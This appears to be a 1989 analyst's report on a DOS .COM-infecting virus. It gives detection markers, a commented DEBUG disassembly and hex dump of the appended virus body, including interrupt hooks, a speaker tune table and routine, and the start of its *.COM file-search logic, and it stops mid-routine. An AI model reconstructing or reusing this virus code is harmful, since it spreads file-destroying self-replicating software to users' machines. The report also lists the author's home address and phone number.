-this report was compiled by thomas vogler, schaeferweg 25, 6107 reinheim,
west germaney. my phone number (voice) is +-49-6162-4349.

-first the most important conclusions:

1. a file that is infected, contains E9 at byte 1 and F1 at byte
offset 4. the size of the file is an integral multiple of 33 (51 (decimal)).

2. the virus infects only .COM files

3. the virus makes itself resident and plays some tunes after a while

-all numbers in this report are in HEX (base 16 (dec)), unless otherwise
stated.

-the two files compared have the following directory characteristics:

 Volume in drive C has no label
 Directory of  C:\APPL\PROCOMM\MTVIRUS

TANK     CO      8488  22.11.89   5.19
TANK1    CO     11271  22.11.89   5.19
        2 File(s)   1650688 bytes free

the files were renamed from .com to .co to avoid unintended starting, all 
numbers above are decimal, due to the dos directory command. the hexadecimal 
sizes of the files are:

TANK.CO   2128
TANK1.CO  2C07

-the file tank1.co is the infected file.

-differences between the two files:

the virus starts at byte 2128 with the byte E9. the virus is somehow relocated
so that the byte at 2128 is originated to be at offset 100 within the code 
segment during execution.

the infected file ends at 2c06 with the bytes 10 3c

thus the virus did append 2C06 - 2128 + 1 = ADF bytes
to the file. 

-below is a disassembly of the virus, carried out with good old debug:


                        ;
                        ; here is the disassemly of the first 4 bytes of
                        ; the infected file tank1.com
                        ;
1CF5:0100 E92521        JMP	2228                  ; jump to the first byte
                                                      ; that was appended to
                                                      ; the original file. the 
                                                      ; offset inside this 
                                                      ; instruction is needed
                                                      ; later

1CF5:0103 F1            db      f1                    ; this byte is used as
                                                      ; an additional marker
                                                      ; during infection of
                                                      ; other files.

                        ;
                        ; here the original code for the old program is 
                        ; located
                        ;

                        db      ? dup (?)


                        ;
                        ; this is the first byte, that was appended to the
                        ; original file. here is the start of the virus, which
                        ; should be treated as originated to 0100.
                        ;
0100      E9DD08        JMP	2B08                  ; jump to the main entry

00F8/2220                          E9 DD 08                          ...
                        ;----------------------------------------------------
0103                    db      4 dup (?)             ; save area for the
                                                      ; original code in the 
                                                      ; com file (4 bytes)
00F8/2220                                   BC FC 19 89                 ....
                        ;----------------------------------------------------

00F8/2220                                               14                  .
0108/2230  00 01 18 17                                       ....            
                        ;----------------------------------------------------
                        ;
                        ; save area for the original int21 vector
                        ;
010C                    dw      ?
010E                    dw      ?

0108/2230              77 03 40 11                               w.@.        

                        ;----------------------------------------------------
                        ;
                        ; save area for the original int27 vector
                        ;
0110                    dw      ?
0112                    dw      ?

0108/2230                          08 09 40 11                       ..@.    
                        ;----------------------------------------------------
                        ;
                        ; save area for the old int20 vector
                        ;
0114                    dw      ?
0116                    dw      ?

0108/2230                                      67 03 40 11               g.@.
                        ;----------------------------------------------------
0118/2240  00 00 00 00                                       ....            
                        ;----------------------------------------------------
                        ;
                        ; here we store the original interrupt 8 (timer)
                        ;
011C                    dw      ?
011E                    dw      ?

0118/2240              AA 00 77 0F-                              ..w.        

                        ;----------------------------------------------------
                        ;
                        ; the following are dependent of order, since both are
                        ; loaded with a lds instruction
                        ;
0120                    dw      ?                     ; offset of dta
0122                    dw      ?                     ; segment of dta

0118/2240                          8A 45 0A 9B                       .E..    
                        ;----------------------------------------------------
                        ;
                        ; in the next section we find the disk transfer area
                        ; the virus uses for search first/search next
                        ; operations
                        ;
0124                    db      21 dup (?)            ; reserved for dos
0139                    db      ?                     ; attributes of file
013A                    dw      ?                     ; time of file
013C                    dw      ?                     ; date of file
013E                    dw      ?                     ; low size
0140                    dw      ?                     ; high size
0142                    db      13 dup (?)            ; packed name

0118/2240                                      03 3F 3F 3F               .???
0128/2250  3F 3F 3F 3F 3F 43 4F 4D-20 20 00 39 00 01 49 10   ?????COM  .9..I.
0138/2260  F6 20 63 2A 76 13 28 21-00 00 54 41 4E 4B 2E 43   . c*v.(!..TANK.C
0148/2270  4F 4D 00 4D 00 00 00                              OM.M...
                        ;----------------------------------------------------
014F                    db      4 dup (?)             ; buffer for first 4 
                                                      ; bytes of a file to
                                                      ; become infected
0148/2270                       E9 25 21 F1                         .%!.      
                        ;----------------------------------------------------
                        ; this is a counter thats decremented during each 
                        ; timer interrupt. if it reaches 0, its reloaded
                        ; with 2
                        ;
0153                    dw      ?

0148/2270                                   14 00                       ..    
                        ;----------------------------------------------------
0155                    DB      '*.COM',0,'\'

0148/2270                                         2A 2E 43                *.C
0158/2280  4F 4D 00 5C                                       OM.\
                        ;----------------------------------------------------
015C                    DB      75 DUP (?),'\'

0158/2280              43 3A 2A 2E-43 4F 4D 00 4F 4D 00 00       C:*.COM.OM..
0168/2290  52 53 45 5C 2A 2E 43 4F-4D 00 52 2E 49 4E 49 00   RSE\*.COM.R.INI.
0178/22A0  00 43 00 00 00 00 00 00-00 00 00 00 00 00 00 00   .C..............
0188/22B0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0198/22C0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 5C   ...............\
                        ;----------------------------------------------------

01A8                    DB      75 DUP (?),'\'

01A8/22D0  43 3A 2A 2E 43 4F 4D 00-00 49 56 45 52 53 45 5C   C:*.COM..IVERSE\
01B8/22E0  2A 2E 43 4F 4D 00 43 4F-4D 00 00 00 00 00 00 00   *.COM.COM.......
01C8/22F0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
01D8/2300  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
01E8/2310  00 00 00 00 00 00 00 00-00 00 00 5C               ...........\
                        ;----------------------------------------------------

01F4                    DB      ?? DUP (?),'\'

01E8-2310                                      43 3A 54 41               C:TA
01F8/2320  4E 4B 2E 43 4F 4D 00 43-4F 4D 00 5C 56 49 50 54   NK.COM.COM.\VIPT
0208/2330  45 53 54 2E 43 4F 4D 00-4D 00 4F 4D 00 00 00 00   EST.COM.M.OM....
0218/2340  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0228/2350  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0238/2360  00 00 00 00 00 00 00 00-00 00 00 00               ............    

                        ;----------------------------------------------------
0244                    db      'COMMAND.COM',0

0238/2360                                      43 4F 4D 4D   ............COMM
0248/2370  41 4E 44 2E 43 4F 4D 00                           AND.COM.            
                        ;----------------------------------------------------

-> at 0255 a table of notes seems to begin, at 0251 there seems to be
   a pointer into this table. the table seems to be terminated by a
   word of 0000. the table consists of 3 byte entrys, which colud be 
   something like tone and duration. the termination is at 2743.

0248/2370                          01                                .
                        ;----------------------------------------------------

0251                    dw      0255                  ; pointer to next note

0248/2370                             55 02                           U.     
                        ;----------------------------------------------------
                        ;
                        ; this is a counter for how long the current tune
                        ; should be played.
                        ;
0253                    dw      ?
0248/2370                                   18 15                       ..   
                        ;----------------------------------------------------
                        ;
                        ; below is the table of tunes to be played when the 
                        ; effect is produced. the table is terminated by a 
                        ; frequency value of 0
                        ;
                tune    macro freq, len
                        dw      freq
                        db      len
                tune    endm
                        ;        
0255                    tune    07E4 ,06
                        tune    07E4 ,06 
                        tune    08DA ,03 
                        tune    0964 ,03 
                        tune    0964 ,06 
                        tune    09F4 ,03 
                        tune    0964 ,03 
                        tune    0964 ,10 
                        tune    0024 ,02 
                        tune    09F4 ,03 
                        tune    0964 ,03 
                        tune    0964 ,06 
                        tune    09F4 ,03 
                        tune    0964 ,03 
                        tune    07E4 ,06 
                        tune    0964 ,03 
                        tune    07E4 ,03
                        tune    08DA ,0C 
                        tune    0A8A ,06 
                        tune    0024 ,03 
                        tune    0A8A ,03 
                        tune    0A8A ,06 
                        tune    0B2C ,03 
                        tune    0A8A ,03 
                        tune    0A8A ,06 
                        tune    0B2C ,03 
                        tune    0A8A ,03 
                        tune    08DA ,10 
                        tune    0024 ,02 
                        tune    0964 ,03 
                        tune    0A8A ,03 
                        tune    0964 ,03 
                        tune    07E4 ,09
                        tune    0708 ,09 
                        tune    0708 ,03 
                        tune    0A8A ,10 
                        tune    0024 ,02 
                        tune    07E4 ,06 
                        tune    07E4 ,06 
                        tune    08DA ,03 
                        tune    0964 ,03 
                        tune    0964 ,06 
                        tune    09F4 ,03 
                        tune    0964 ,03 
                        tune    0964 ,10 
                        tune    0024 ,02 
                        tune    09F4 ,03 
                        tune    0964 ,03 
                        tune    0964 ,06
                        tune    09F4 ,03 
                        tune    0964 ,03 
                        tune    08DA ,03 
                        tune    0964 ,03 
                        tune    0A8A ,05 
                        tune    0C87 ,01 
                        tune    0A8A ,0C 
                        tune    0BD3 ,06 
                        tune    0024 ,03 
                        tune    0BD3 ,03 
                        tune    0BD3 ,06 
                        tune    0C87 ,03 
                        tune    0BD3 ,03 
                        tune    09F4 ,06 
                        tune    0A8A ,03 
                        tune    0BD3 ,03
                        tune    05E9 ,0F 
                        tune    0024 ,03 
                        tune    0BD3 ,03 
                        tune    0A8A ,03 
                        tune    0964 ,03 
                        tune    07E4 ,01 
                        tune    0024 ,02 
                        tune    0BD3 ,03 
                        tune    0A8A ,03 
                        tune    0964 ,03 
                        tune    07E4 ,01 
                        tune    0024 ,02 
                        tune    0FCF ,03 
                        tune    0E16 ,05 
                        tune    0964 ,01 
                        tune    0A8A ,0C
                        tune    0BD3 ,01 
                        tune    000A ,0F 
                        tune    0FCF ,04 
                        tune    0C87 ,04 
                        tune    0A8A ,04 
                        tune    0A8A ,04 
                        tune    0024 ,04 
                        tune    0545 ,02 
                        tune    0024 ,02 
                        tune    0545 ,02 
                        tune    0024 ,06 
                        tune    0643 ,02 
                        tune    0024 ,02 
                        tune    0643 ,02 
                        tune    0024 ,06 
                        tune    0FCF ,04
                        tune    0FCF ,04 
                        tune    0C87 ,04 
                        tune    0A8A ,04 
                        tune    0A8A ,04 
                        tune    0024 ,04 
                        tune    0545 ,02 
                        tune    0024 ,02 
                        tune    0545 ,02 
                        tune    0024 ,06 
                        tune    05E9 ,02 
                        tune    0024 ,02 
                        tune    05E9 ,02 
                        tune    0024 ,06 
                        tune    10B8 ,04 
                        tune    10B8 ,04 
                        tune    0E16 ,04
                        tune    0964 ,04 
                        tune    0964 ,04 
                        tune    0024 ,04 
                        tune    04B2 ,02 
                        tune    0024 ,02 
                        tune    04B2 ,02 
                        tune    0024 ,06 
                        tune    05E9 ,02 
                        tune    0024 ,02 
                        tune    05E9 ,02 
                        tune    0024 ,06 
                        tune    10B8 ,04 
                        tune    10B8 ,04 
                        tune    0E16 ,04 
                        tune    0964 ,04 
                        tune    0964 ,04
                        tune    0024 ,04 
                        tune    04B2 ,02 
                        tune    0024 ,02 
                        tune    04B2 ,02 
                        tune    0024 ,06 
                        tune    0643 ,02 
                        tune    0024 ,02 
                        tune    0643 ,02 
                        tune    0024 ,06 
                        tune    0FCF ,04 
                        tune    0FCF ,04 
                        tune    0C87 ,04 
                        tune    0A8A ,04 
                        tune    07E4 ,04 
                        tune    0024 ,04 
                        tune    03F2 ,02
                        tune    0024 ,02 
                        tune    03F2 ,02 
                        tune    0024 ,06 
                        tune    0545 ,02 
                        tune    0024 ,02 
                        tune    0545 ,02 
                        tune    0024 ,06 
                        tune    0FCF ,04 
                        tune    0FCF ,04 
                        tune    0C87 ,04 
                        tune    0A8A ,04 
                        tune    07E4 ,04 
                        tune    0024 ,04 
                        tune    03F2 ,02 
                        tune    0024 ,02 
                        tune    03F2 ,02
                        tune    0024 ,06 
                        tune    04B2 ,02 
                        tune    0024 ,02 
                        tune    04B2 ,02 
                        tune    0024 ,06 
                        tune    0E16 ,04 
                        tune    0E16 ,04 
                        tune    0BD3 ,04 
                        tune    0964 ,02 
                        tune    0024 ,02 
                        tune    0964 ,0E 
                        tune    0024 ,02 
                        tune    0B2C ,04 
                        tune    0A8A ,04 
                        tune    0643 ,10 
                        tune    07E4 ,04
                        tune    0C87 ,04 
                        tune    0C87 ,08 
                        tune    0E16 ,04 
                        tune    0964 ,08 
                        tune    0A8A ,04 
                        tune    0FCF ,04 
                        tune    0024 ,02 
                        tune    0FCF ,02 
                        tune    0FCF ,04 
                        tune    0024 ,08 
                        tune    0A8A ,02 
                        tune    0024 ,02 
                        tune    0BD3 ,02 
                        tune    0024 ,06 
                        tune    0A8A ,02 
                        tune    0024 ,02
                        tune    0BD3 ,02 
                        tune    0024 ,06 
                        tune    0A8A ,04 
                        tune    0643 ,10 
                        tune    0708 ,04 
                        tune    0A8A ,02 
                        tune    0024 ,02 
                        tune    0C87 ,02 
                        tune    0024 ,06 
                        tune    0A8A ,02 
                        tune    0024 ,02 
                        tune    0C87 ,02 
                        tune    0024 ,06 
                        tune    0A8A ,04 
                        tune    0708 ,10 
                        tune    07E4 ,04
                        tune    0A8A ,02 
                        tune    0024 ,02 
                        tune    0BD3 ,02 
                        tune    0024 ,06 
                        tune    0A8A ,02 
                        tune    0024 ,02 
                        tune    0BD3 ,02 
                        tune    0024 ,06 
                        tune    0A8A ,04 
                        tune    0643 ,10 
                        tune    0708 ,04 
                        tune    0A8A ,04 
                        tune    07E4 ,04 
                        tune    0708 ,04 
                        tune    0643 ,04 
                        tune    0545 ,08
                        tune    05E9 ,04 
                        tune    0643 ,02 
                        tune    0643 ,02 
                        tune    0643 ,04 
                        tune    0708 ,02 
                        tune    0024 ,02 
                        tune    07E4 ,04 
                        tune    0024 ,08 
                        tune    000A ,0F 
                        tune    0773 ,02 
                        tune    07E4 ,02 
                        tune    07E4 ,04 
                        tune    0773 ,02 
                        tune    07E4 ,02 
                        tune    07E4 ,04 
                        tune    0773 ,02
                        tune    07E4 ,02 
                        tune    07E4 ,04 
                        tune    04F8 ,04 
                        tune    0024 ,04 
                        tune    04F8 ,02 
                        tune    0545 ,02 
                        tune    05E9 ,04 
                        tune    05E9 ,02 
                        tune    06A4 ,02 
                        tune    0773 ,04 
                        tune    0773 ,02 
                        tune    07E4 ,02 
                        tune    08DA ,04 
                        tune    08DA ,04 
                        tune    0024 ,04 
                        tune    07E4 ,02
                        tune    08DA ,02 
                        tune    08DA ,04 
                        tune    07E4 ,02 
                        tune    08DA ,02 
                        tune    08DA ,04 
                        tune    07E4 ,02 
                        tune    08DA ,02 
                        tune    08DA ,04 
                        tune    0545 ,04 
                        tune    0024 ,04 
                        tune    0545 ,02 
                        tune    05E9 ,02 
                        tune    0643 ,04 
                        tune    0643 ,02 
                        tune    0773 ,02 
                        tune    07E4 ,04
                        tune    07E4 ,02 
                        tune    08DA ,02 
                        tune    09F4 ,04 
                        tune    09F4 ,04 
                        tune    0024 ,04 
                        tune    04F8 ,02 
                        tune    0545 ,02 
                        tune    0545 ,04 
                        tune    046E ,04 
                        tune    0643 ,04 
                        tune    0545 ,04 
                        tune    05E9 ,04 
                        tune    07E4 ,04 
                        tune    0024 ,04 
                        tune    04F8 ,02 
                        tune    0545 ,02
                        tune    0545 ,04 
                        tune    046E ,04 
                        tune    0643 ,04 
                        tune    0545 ,04 
                        tune    05E9 ,04 
                        tune    04F8 ,04 
                        tune    0545 ,02 
                        tune    05E9 ,02 
                        tune    06A4 ,02 
                        tune    0773 ,02 
                        tune    07E4 ,04 
                        tune    0C87 ,04 
                        tune    0BD3 ,04 
                        tune    0A8A ,04 
                        tune    09F4 ,04 
                        tune    08DA ,02
                        tune    09F4 ,02 
                        tune    0A8A ,04 
                        tune    0BD3 ,04 
                        tune    07E4 ,04 
                        tune    0024 ,04 
                        tune    042E ,08 
                        tune    03F2 ,02 
                        tune    0024 ,06 
                        tune    042E ,08 
                        tune    03F2 ,02 
                        tune    0024 ,06 
                        tune    042E ,08 
                        tune    03F2 ,04 
                        tune    042E ,04 
                        tune    03F2 ,04 
                        tune    042E ,04
                        tune    03F2 ,04 
                        tune    0000 ,0F                             

0248/2370                                         E4 07 06                ...
0258/2380  E4 07 06 DA 08 03 64 09-03 64 09 06 F4 09 03 64   ......d..d.....d
0268/2390  09 03 64 09 10 24 00 02-F4 09 03 64 09 03 64 09   ..d..$.....d..d.
0278/23A0  06 F4 09 03 64 09 03 E4-07 06 64 09 03 E4 07 03   ....d.....d.....
0288/23B0  DA 08 0C 8A 0A 06 24 00-03 8A 0A 03 8A 0A 06 2C   ......$........,
0298/23C0  0B 03 8A 0A 03 8A 0A 06-2C 0B 03 8A 0A 03 DA 08   ........,.......
02A8/23D0  10 24 00 02 64 09 03 8A-0A 03 64 09 03 E4 07 09   .$..d.....d.....
02B8/23E0  08 07 09 08 07 03 8A 0A-10 24 00 02 E4 07 06 E4   .........$......
02C8/23F0  07 06 DA 08 03 64 09 03-64 09 06 F4 09 03 64 09   .....d..d.....d.
02D8/2400  03 64 09 10 24 00 02 F4-09 03 64 09 03 64 09 06   .d..$.....d..d..
02E8/2410  F4 09 03 64 09 03 DA 08-03 64 09 03 8A 0A 05 87   ...d.....d......
02F8/2420  0C 01 8A 0A 0C D3 0B 06-24 00 03 D3 0B 03 D3 0B   ........$.......
0308/2430  06 87 0C 03 D3 0B 03 F4-09 06 8A 0A 03 D3 0B 03   ................
0318/2440  E9 05 0F 24 00 03 D3 0B-03 8A 0A 03 64 09 03 E4   ...$........d...
0328/2450  07 01 24 00 02 D3 0B 03-8A 0A 03 64 09 03 E4 07   ..$........d....
0338/2460  01 24 00 02 CF 0F 03 16-0E 05 64 09 01 8A 0A 0C   .$........d.....
0348/2470  D3 0B 01 0A 00 0F CF 0F-04 87 0C 04 8A 0A 04 8A   ................
0358/2480  0A 04 24 00 04 45 05 02-24 00 02 45 05 02 24 00   ..$..E..$..E..$.
0368/2490  06 43 06 02 24 00 02 43-06 02 24 00 06 CF 0F 04   .C..$..C..$.....
0378/24A0  CF 0F 04 87 0C 04 8A 0A-04 8A 0A 04 24 00 04 45   ............$..E
0388/24B0  05 02 24 00 02 45 05 02-24 00 06 E9 05 02 24 00   ..$..E..$.....$.
0398/24C0  02 E9 05 02 24 00 06 B8-10 04 B8 10 04 16 0E 04   ....$...........
03A8/24D0  64 09 04 64 09 04 24 00-04 B2 04 02 24 00 02 B2   d..d..$.....$...
03B8/24E0  04 02 24 00 06 E9 05 02-24 00 02 E9 05 02 24 00   ..$.....$.....$.
03C8/24F0  06 B8 10 04 B8 10 04 16-0E 04 64 09 04 64 09 04   ..........d..d..
03D8/2500  24 00 04 B2 04 02 24 00-02 B2 04 02 24 00 06 43   $.....$.....$..C
03E8/2510  06 02 24 00 02 43 06 02-24 00 06 CF 0F 04 CF 0F   ..$..C..$.......
03F8/2520  04 87 0C 04 8A 0A 04 E4-07 04 24 00 04 F2 03 02   ..........$.....
0408/2530  24 00 02 F2 03 02 24 00-06 45 05 02 24 00 02 45   $.....$..E..$..E
0418/2540  05 02 24 00 06 CF 0F 04-CF 0F 04 87 0C 04 8A 0A   ..$.............
0428/2550  04 E4 07 04 24 00 04 F2-03 02 24 00 02 F2 03 02   ....$.....$.....
0438/2560  24 00 06 B2 04 02 24 00-02 B2 04 02 24 00 06 16   $.....$.....$...
0448/2570  0E 04 16 0E 04 D3 0B 04-64 09 02 24 00 02 64 09   ........d..$..d.
0458/2580  0E 24 00 02 2C 0B 04 8A-0A 04 43 06 10 E4 07 04   .$..,.....C.....
0468/2590  87 0C 04 87 0C 08 16 0E-04 64 09 08 8A 0A 04 CF   .........d......
0478/25A0  0F 04 24 00 02 CF 0F 02-CF 0F 04 24 00 08 8A 0A   ..$........$....
0488/25B0  02 24 00 02 D3 0B 02 24-00 06 8A 0A 02 24 00 02   .$.....$.....$..
0498/25C0  D3 0B 02 24 00 06 8A 0A-04 43 06 10 08 07 04 8A   ...$.....C......
04A8/25D0  0A 02 24 00 02 87 0C 02-24 00 06 8A 0A 02 24 00   ..$.....$.....$.
04B8/25E0  02 87 0C 02 24 00 06 8A-0A 04 08 07 10 E4 07 04   ....$...........
04C8/25F0  8A 0A 02 24 00 02 D3 0B-02 24 00 06 8A 0A 02 24   ...$.....$.....$
04D8/2600  00 02 D3 0B 02 24 00 06-8A 0A 04 43 06 10 08 07   .....$.....C....
04E8/2610  04 8A 0A 04 E4 07 04 08-07 04 43 06 04 45 05 08   ..........C..E..
04F8/2620  E9 05 04 43 06 02 43 06-02 43 06 04 08 07 02 24   ...C..C..C.....$
0508/2630  00 02 E4 07 04 24 00 08-0A 00 0F 73 07 02 E4 07   .....$.....s....
0518/2640  02 E4 07 04 73 07 02 E4-07 02 E4 07 04 73 07 02   ....s........s..
0528/2650  E4 07 02 E4 07 04 F8 04-04 24 00 04 F8 04 02 45   .........$.....E
0538/2660  05 02 E9 05 04 E9 05 02-A4 06 02 73 07 04 73 07   ...........s..s.
0548/2670  02 E4 07 02 DA 08 04 DA-08 04 24 00 04 E4 07 02   ..........$.....
0558/2680  DA 08 02 DA 08 04 E4 07-02 DA 08 02 DA 08 04 E4   ................
0568/2690  07 02 DA 08 02 DA 08 04-45 05 04 24 00 04 45 05   ........E..$..E.
0578/26A0  02 E9 05 02 43 06 04 43-06 02 73 07 02 E4 07 04   ....C..C..s.....
0588/26B0  E4 07 02 DA 08 02 F4 09-04 F4 09 04 24 00 04 F8   ............$...
0598/26C0  04 02 45 05 02 45 05 04-6E 04 04 43 06 04 45 05   ..E..E..n..C..E.
05A8/26D0  04 E9 05 04 E4 07 04 24-00 04 F8 04 02 45 05 02   .......$.....E..
05B8/26E0  45 05 04 6E 04 04 43 06-04 45 05 04 E9 05 04 F8   E..n..C..E......
05C8/26F0  04 04 45 05 02 E9 05 02-A4 06 02 73 07 02 E4 07   ..E........s....
05D8/2700  04 87 0C 04 D3 0B 04 8A-0A 04 F4 09 04 DA 08 02   ................
05E8/2710  F4 09 02 8A 0A 04 D3 0B-04 E4 07 04 24 00 04 2E   ............$...
05F8/2720  04 08 F2 03 02 24 00 06-2E 04 08 F2 03 02 24 00   .....$........$.
0608/2730  06 2E 04 08 F2 03 04 2E-04 04 F2 03 04 2E 04 04   ................
0618/2740  F2 03 04 00 00 0F                                 ......

                        ;
                        ; this procedure gets called every second timer
                        ; interrupt (ie approx each 36.4 msecs), when the
                        ; playing of a tune was enabled.
                        ;

1E72:2746 FF0E5302      DEC	WORD PTR [0253]       ; decrement counter of
                                                      ; timer ticks
1E72:274A A15302        MOV	AX,[0253]                          
1E72:274D 3D0100        CMP	AX,0001                            
1E72:2750 7406          JZ	2758                  ; turn off speaker. at 
                                                      ; the next tick, the 
                                                      ; next note will be 
                                                      ; played

1E72:2752 3D0000        CMP	AX,0000
1E72:2755 740C          JZ	2763                  ; start to play the next             
                                                      ; note if we reach 0

1E72:2757 C3            RET	                      ; no change, continue

                        ;
                        ; turn off speaker
                        ;

1E72:2758 E461          IN	AL,61                              
1E72:275A 8AE0          MOV	AH,AL                              
1E72:275C 24FC          AND	AL,FC                              
1E72:275E EB00          JMP	$+2                               
1E72:2760 E661          OUT	61,AL                              
1E72:2762 C3            RET	                                   

                        ;
                        ; first some new counter for
                        ; [0253] is computed
                        ;

1E72:2763 8B365102      MOV	SI,[0251]             ; make si point to the
                                                      ; entry for the next 
                                                      ; tune to be played
1E72:2767 8306510203    ADD	WORD PTR [0251],+03   ; point to the next tune
1E72:276C 8B1C          MOV	BX,[SI]               ; get frequency
1E72:276E 8A4402        MOV	AL,[SI+02]            ; get duration
1E72:2771 98            CBW	                      ; clear ah             
1E72:2772 83FB0A        CMP	BX,+0A                             
1E72:2775 7702          JA	2779                  ; if the frequency to
                                                      ; be played is below
                                                      ; or equal 0A we make
                                                      ; a longer pause. this
                                                      ; is done by swapping
                                                      ; the high and low parts
                                                      ; of the ax register
1E72:2777 86C4          XCHG	AL,AH
1E72:2779 A35302        MOV	[0253],AX             ; store new counter             
1E72:277C 83FB00        CMP	BX,+00                ; play a tune             
1E72:277F 7508          JNZ	2789                               

                        ;
                        ; when we come here, the table terminated. we
                        ; set up the pointer at 0251 to point again to the
                        ; beginning of the table and we turn of the speaker.
                        ;
1E72:2781 C70651025502  MOV	WORD PTR [0251],0255               
1E72:2787 EBCF          JMP	2758                  ; turn off speaker

                        ;
                        ; now start playing a tone with a frequency given by
                        ; the bx register
                        ;

1E72:2789 B0B6          MOV	AL,B6                              
1E72:278B E643          OUT	43,AL                              
1E72:278D 8BC3          MOV	AX,BX                              
1E72:278F E642          OUT	42,AL                              
1E72:2791 EB00          JMP	$+2
1E72:2793 8AC4          MOV	AL,AH                              
1E72:2795 E642          OUT	42,AL                              

                        ;
                        ; enable the speaker
                        ;

1E72:2797 E461          IN	AL,61                              
1E72:2799 8AE0          MOV	AH,AL                              
1E72:279B 0C03          OR	AL,03                              
1E72:279D EB00          JMP	$+2
1E72:279F E661          OUT	61,AL                              

1E72:27A1 C3            RET	                                   

                        ;
                        ; this is the interposer for the timer interrupt
                        ;

1E72:27A2 9C            PUSHF	                                   
1E72:27A3 50            PUSH	AX                                 
1E72:27A4 53            PUSH	BX                                 
1E72:27A5 51            PUSH	CX                                 
1E72:27A6 52            PUSH	DX                                 
1E72:27A7 56            PUSH	SI                                 
1E72:27A8 57            PUSH	DI                                 
1E72:27A9 55            PUSH	BP                                 
1E72:27AA 1E            PUSH	DS                                 
1E72:27AB 06            PUSH	ES                                 
1E72:27AC 9C            PUSHF	                                   
1E72:27AD 2E            CS:	                                   
1E72:27AE FF1E1C01      CALL	FAR [011C]            ; call original routine             
1E72:27B2 FB            STI	                                   
1E72:27B3 8CC8          MOV	AX,CS                              
1E72:27B5 8ED8          MOV	DS,AX                 ; addressability
1E72:27B7 833E530100    CMP	WORD PTR [0153],+00                
1E72:27BC 740F          JZ	27CD                  ; not playing currently             
1E72:27BE FF0E5301      DEC	WORD PTR [0153]                    
1E72:27C2 7509          JNZ	27CD                  ; not the second tick             
1E72:27C4 E87FFF        CALL	2746                  ; one tick advanced             
1E72:27C7 C70653010200  MOV	WORD PTR [0153],0002  ; and restart the next
                                                      ; time             
1E72:27CD 07            POP	ES                                 
1E72:27CE 1F            POP	DS                                 
1E72:27CF 5D            POP	BP                                 
1E72:27D0 5F            POP	DI                                 
1E72:27D1 5E            POP	SI                                 
1E72:27D2 5A            POP	DX                                 
1E72:27D3 59            POP	CX                                 
1E72:27D4 5B            POP	BX                                 
1E72:27D5 58            POP	AX                                 
1E72:27D6 9D            POPF	                                   
1E72:27D7 CF            IRET	                                   

                        ;
                        ; when we come here, we should start up an effect.
                        ; this is done by initialising pointers and flags to
                        ; get the music via the timer interrupt playing.
                        ;

1E72:27D8 8CC8          MOV	AX,CS                              
1E72:27DA 8ED8          MOV	DS,AX                              
1E72:27DC FE060701      INC	BYTE PTR [0107]       ; ?count number of times
                                                      ; an effect was 
                                                      ; produced?
1E72:27E0 C606500200    MOV	BYTE PTR [0250],00    ; ??
1E72:27E5 C70653011400  MOV	WORD PTR [0153],0014  ; start playing             
1E72:27EB C70651025502  MOV	WORD PTR [0251],0255  ; set pointer to the 
                                                      ; next note
1E72:27F1 C70653021815  MOV	WORD PTR [0253],1518  ; before we start 
                                                      ; playing, wait about
                                                      ; 2*1518 timer ticks.
                                                      ; this is about 32 (dec)
                                                      ; minutes.
1E72:27F7 C3            RET	                                   

                        ;
                        ; routine to copy an asciiz string
                        ;

                strcpy:
1E72:27F8 AC            LODSB	                                   
1E72:27F9 AA            STOSB	                                   
1E72:27FA 3C00          CMP	AL,00                              
1E72:27FC 75FA          JNZ	strcpy                               
1E72:27FE C3            RET	                                   

                        ;
                        ; routine to compare asciiz strings given by si and
                        ; di. return z for equal, nz for different.
                        ;
                strcmp:
1E72:27FF AC            LODSB	                                   
1E72:2800 3A05          CMP	AL,[DI]                            
1E72:2802 7507          JNZ	280B                               
1E72:2804 3C00          CMP	AL,00                              
1E72:2806 7403          JZ	280B                               
1E72:2808 47            INC	DI                                 
1E72:2809 EBF4          JMP	strcmp                               
1E72:280B C3            RET	                                   

1E72:280C FC            CLD	                                   
1E72:280D 8CC8          MOV	AX,CS                              
1E72:280F 8EC0          MOV	ES,AX                              
1E72:2811 8BF2          MOV	SI,DX                              
1E72:2813 8A04          MOV	AL,[SI]                            
1E72:2815 3C00          CMP	AL,00                              
1E72:2817 7507          JNZ	2820                               
1E72:2819 B419          MOV	AH,19                              
1E72:281B E8E202        CALL	int21                  ; get current disk             
1E72:281E FEC0          INC	AL                                 
1E72:2820 0440          ADD	AL,40                 ; now al is the drive
                                                      ; letter             
1E72:2822 2E            CS:	                                   
1E72:2823 A25C01        MOV	[015C],AL             ; store drive letter             
1E72:2826 2E            CS:	                                   
1E72:2827 C6065D013A    MOV	BYTE PTR [015D],':'   ; store colon                 
1E72:282C 2E            CS:	                                   
1E72:282D C6065E0100    MOV	BYTE PTR [015E],00    ; terminate string             
1E72:2832 EB0D          JMP	2841                               

                        ;
                        ; the next section is called for some dos functions
                        ; dealing with asciiz filenames
                        ;

1E72:2834 FC            CLD	                                   
1E72:2835 8CC8          MOV	AX,CS                              
1E72:2837 8EC0          MOV	ES,AX                              
1E72:2839 8BF2          MOV	SI,DX                              
1E72:283B BF5C01        MOV	DI,015C                            
1E72:283E E8B7FF        CALL	strcpy                               

                        ;
                        ; this is a direct entry to ???
                        ;

1E72:2841 8CC8          MOV	AX,CS                              
1E72:2843 8ED8          MOV	DS,AX                              
1E72:2845 BF5C01        MOV	DI,015C               ; start of string             
1E72:2848 B000          MOV	AL,00                              
1E72:284A B94B00        MOV	CX,004B               ; maximum length             
1E72:284D F2            REPNZ	                                   
1E72:284E AE            SCASB	                      ; now di points to the
                                                      ; 00 byte terminating
                                                      ; the string

                        ;
                        ; in the next sectio the point where we can append
                        ; *.COM to the string is located.
                        ;

1E72:284F 8A45FF        MOV	AL,[DI-01]                         
1E72:2852 3C3A          CMP	AL,':'                              
1E72:2854 7407          JZ	285D                               
1E72:2856 3C5C          CMP	AL,'\'                              
1E72:2858 7403          JZ	285D                               
1E72:285A 4F            DEC	DI                                 
1E72:285B EBF2          JMP	284F                               

                        ;
                        ; when we come here, di points to the first byte
                        ; after the last directory separator of after the
                        ; drive separator.
                        ;

1E72:285D BE5501        MOV	SI,0155                            
1E72:2860 E895FF        CALL	strcpy                             
  
                        ;
                        ; test if the current name was already searched for.
